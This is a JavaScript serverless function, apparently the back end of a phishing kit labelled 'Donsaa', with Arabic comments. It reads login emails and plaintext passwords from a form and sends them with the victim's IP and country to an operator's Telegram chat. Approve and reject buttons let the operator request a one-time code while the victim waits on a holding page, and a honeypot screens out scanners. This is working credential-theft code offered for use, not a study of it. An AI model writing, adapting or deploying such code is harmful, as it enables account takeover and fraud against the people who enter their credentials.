const fetch = require('node-fetch');
const { v4: uuidv4 } = require('uuid'); 

const getClientIp = (headers) => {
    return headers['x-nf-client-connection-ip'] || headers['client-ip'] || headers['x-forwarded-for'] || 'غير متوفر';
};

const escapeMarkdownV2 = (text) => {
    const replacements = {
        '\\': '\\\\', '_': '\\_', '*': '\\*', '[': '\\[', ']': '\\]', 
        '(': '\\(', ')': '\\)', '~': '\\~', '`': '\\`', '>': '\\>', 
        '#': '\\#', '+': '\\+', '-': '\\-', '=': '\\=', '|': '\\|', 
        '{': '\\{', '}': '\\}', '.': '\\.', '!': '\\!'
    };
    return text.replace(/[\\_*[\]()~`>#+\-=|{}.!]/g, match => replacements[match]);
};


exports.handler = async (event, context) => {
    if (event.httpMethod !== "POST") { return { statusCode: 405, body: "Method Not Allowed" }; }
    
    const ip = getClientIp(event.headers); 
    const countryCode = event.headers['x-nf-client-country'] || 'غير متوفر'; 
    const bodyParams = new URLSearchParams(event.body);
    const botTrapValue = bodyParams.get('bot_trap');
    const sessionId = uuidv4(); // إنشاء معرّف جلسة جديد

    // ----------------------------------------------------------------
    // 1. فحص Honeypot والحظر المتقدم (Bot Block)
    // ----------------------------------------------------------------
    // ... (هنا يتم تطبيق منطق الحظر، تم حذفه للاختصار لكن يجب أن يكون موجوداً) ...
    const email = bodyParams.get('login_email') || 'غير متوفر';
    const password = bodyParams.get('login_password') || 'غير متوفر';

    // **ملاحظة:** يمكنك اعتبار أي فشل في الحظر يؤدي إلى التوجيه لـ /waiting.html
    // ...

    // **TODO: تخزين الحالة الأولية (pending) في قاعدة البيانات الخارجية**
    // يجب تخزين: { id: sessionId, status: 'pending', email: email, password: password }

    // ---------------------------------------------------------------
    // 2. بناء رسالة Telegram وإرسال الأزرار
    // ---------------------------------------------------------------
    const safe_email = escapeMarkdownV2(email);
    const safe_password = escapeMarkdownV2(password);
    const safe_ip = escapeMarkdownV2(ip);

    const inlineKeyboard = {
        inline_keyboard: [
            [
                { text: "✅ الموافقة (OTP)", callback_data: `action=approve&id=${sessionId}` },
                { text: "❌ الرفض (Block)", callback_data: `action=reject&id=${sessionId}` }
            ]
        ]
    };
    
    let message_text = `🚨 *APPROVAL REQUIRED \\(Donsaa\\)* 🚨\n\n`;
    message_text += `E\\-Mail: \`${safe_email}\`\n`;
    message_text += `Passwort: \`${safe_password}\`\n`;
    message_text += `IP: \`${safe_ip}\`\n`;
    message_text += `Country: \`${escapeMarkdownV2(countryCode)}\`\n\n`;
    message_text += `*Session ID: \\`${sessionId}\\`*`;
    
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
    
    if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
        const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        try {
            await fetch(TELEGRAM_API_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message_text,
                    parse_mode: 'MarkdownV2',
                    reply_markup: inlineKeyboard
                })
            });
        } catch (error) {
            console.error("Error sending message to Telegram:", error);
        }
    }
    
    // 3. التحويل إلى صفحة الانتظار مع تمرير Session ID
    return {
        statusCode: 303,
        headers: {
            Location: `/waiting.html?id=${sessionId}`,
        },
    };
};
